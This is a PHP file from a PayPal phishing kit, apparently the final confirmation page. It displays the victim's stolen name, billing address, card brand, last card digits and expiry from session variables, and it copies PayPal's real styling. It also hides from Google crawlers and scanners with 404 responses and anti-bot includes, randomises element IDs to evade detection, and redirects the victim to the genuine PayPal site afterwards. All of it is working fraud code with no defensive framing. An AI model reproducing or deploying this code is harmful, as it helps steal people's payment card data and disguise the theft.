<?php

session_start();
error_reporting(0); 
//------------------------------------------------------------------------------------------------------------//
include('../functions/get_lang.php');
//------------------------------------------------------------------------------------------------------------//
$icon_card = "pp.png";
if(isset($_SESSION['_cc_brand_'] )) {
if ($_SESSION['_cc_brand_'] == "AMEX") { $icon_card = "ae.png";}
if ($_SESSION['_cc_brand_'] == "JCB") { $icon_card = "jc.png";}
if ($_SESSION['_cc_brand_'] == "DINERS CLUB") { $icon_card = "ae.png";}
if ($_SESSION['_cc_brand_'] == "DINERS CLUB GLOBAL") { $icon_card = "ae.png";}
if ($_SESSION['_cc_brand_'] == "VISA") { $icon_card = "v.png";}
if ($_SESSION['_cc_brand_'] == "VISA ELECTRON") { $icon_card = "v.png";}
if ($_SESSION['_cc_brand_'] == "MASTERCARD") { $icon_card = "mc.png";}
if ($_SESSION['_cc_brand_'] == "MAESTRO") { $icon_card = "ms.png";}
if ($_SESSION['_cc_brand_'] == "DISCOVER") { $icon_card = "d.png";}
}
//------------------------------------------------------------------------------------------------------------//
        include('../anti_bots/all_antibots.php'); 
        include('../anti_bots/index.php');
//------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//------------------------------------------------------------------------------------------------------------//
?>
<html dir="ltr" id="<?="PP-ID00".rand(118, 10011454198745)?>">
  <head>
    <script async="" src="https://www.paypalobjects.com/tagmgmt/bootstrap.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Condensed">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex">
    <meta http-equiv="Accept-CH" content="Device-Memory">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Condensed">
    <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/b68/a04c217f6513295c043c0faf19ab1/css/styles.css" type="text/css">
    <title><?=$Congratulations;?></title>
    <!---------------------------- FONTS ROBOT CONDDENSED ----------------------------->
    <link rel="shortcut icon" type="image/x-icon" href="../Mpic/Mfour.ico">
    <link rel="apple-touch-icon" href="../Mpic/Mone.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <meta http-equiv="refresh" content="5;URL='https://www.paypal.com/myaccount/home'" /> 
    <!------------------------------- FILES CSS STYLE --------------------------------->
    <link rel="stylesheet" href="../Mfiles/Meight.css">
    <link rel="stylesheet" href="../Mfiles/Msix.css">
  <!------------------------------- FILES CSS STYLE --------------------------------->

  <style>
  .start {
    font-size: 0.8em;
    margin-left: 2%;
  }
  .address {
    color: #656565;
    font-weight:200;
  }
  #Cd988X {
    border: 1px solid #0070ba;
      font-size: 14px;
      font-weight: bold;
      padding-top: 16px;
      padding-right: 10px;
      padding-left: 10px;
      border-radius: 5px;
      width: 90%;
        margin-right: 4%;
  }
  h4 {
    font-weight: 200;
      color: #656565;
  }
  .Z118-Icon{
        background-position: left top;
        background-image: url(../Mpic/Mtwo.png);
        background-repeat: no-repeat;
        display: inline-block;
        height: 100px;
        width: 100px;
    margin-top: 10px;
  }
  @media all and (max-width: 767px){
    .Z118-Icon{margin-top: 0px;}
  }
  </style>
  </head>
<body id="<?=rand(98, 45)."x_N666N".rand(11800918, 1001198745)?>" class="<?=rand(98, 45)."v_x666x".rand(11800918, 1001198745)?>">
    <br>
    <div id="xGhostRiderForm" class="ng-scope">
      <div id="xx_GOxGO" class="ng-scope ng-isolate-scope">
        <div id="xx_GOxGO" class="xo-checkout-wrapper ng-scope">
          <div class="outerWrapper" id="outerWrapper">
            <div id="wrapper" class="clearfix" style="width: 600px;">
              <div id="sliding-area" style="width: 600px;">
                <div id="main" style="width: 600px;">
                  <div class="paypalHeaderWrapper">
                    <div class="span14 clearfix paypalHeader">
                      <div id="paypalLogo" class="logo ng-scope">
                      </div>
                    </div>
                  </div>

<div id="WorldWide" class="WorldWide xGhostxRider_JC">
                    <div class="x_V654DF654THEBEASTXX">
                        <form method="post">
                            <div class="D_AvengersHERE789"><span>○</span><span>○</span><span>○</span><span class="selected">●</span></div>
                            <div align="center" class="HeaderZ118">
                              <p>
                                <h2><?=$Congratulations;?></h2></p>
                            </div>
                            <hr style="width: 75%;">
                            <div><br>
                                <p style="text-align: center;font-size: 1.2em;width: 90%;padding-left: 6%;"><?=$CongratP;?></p>
                            </div>
                            <div class="MightyxMorphin" id="<?="PP-ID118".rand(1180018, 1001198745)?>">
                                <div class="0Dats_Good0" style="margin-left: 4%;">
                <center><span class="Z118-Icon"></span></center><br>
                                    <p><?=$Votre;?></p>
                                    <div class="start">
                                        <p style="text-transform: capitalize;" class="address">
                      <?php echo $_SESSION['_fullname_'];?>
                              <br>
                      <?php echo $_SESSION['_billingAddress_'];?>
                      <br>
                      <?php echo ucwords(strtolower($_SESSION['_country_'])); ?>
                    </p>
                  </div>
                                    <div class="x_GxMarvelxDC">
                                        <div class="AddressLine" id="<?="PP-ID118".rand(1180018, 1001198745)?>">
                                            <p><?=$_SESSION['_cc_brand_']."".$tarjeta;?></p>
                                            <center>
                                                <div id="Cd988X">
                                                    <table border="0" width="95%" align="center" style="margin-top: -15px;margin-bottom: -1px;">
                                                        <tbody>
                                                            <tr>
                                                                <td align="left" valign="left">
                                                                    <img src="./icons/<?=$icon_card;?>"></td>
                                                                <td align="center" valign="center">
                                                                    <h4>XXXX XXXX XXXX <?=substr($_SESSION['_cc_number_'] , -4);?></h4></td>
                                                                <td align="right" valign="right">
                                                                    <h4><?=$_SESSION['_expirationDate_']; ?></h4></td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                </div>
                                                <br>
                                            </center>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>



                </div>
              </div>
            </div>
              <footer>
                <div class="footer clearfix commonFooter">
                  <div class="footerWrapper">
                    <ul class="footerLinks ng-scope">
                      <li><a ><?=$Legal;?></a></li>
                      <li><a ><?=$User;?></a></li>
                      <li><a ><?=$Privacy;?></a></li>
                      <li><a ><?=$Feedback;?></a></li>
                      <li><?=$date;?></li>
                      <li>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </li>
                    </ul>
                  </div>
                </div>
              </footer>
          </div>
        </div>
      </div>
    </div>
    <!------------------------------- FILE JAVASCRIPT --------------------------------->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  </body>
</html>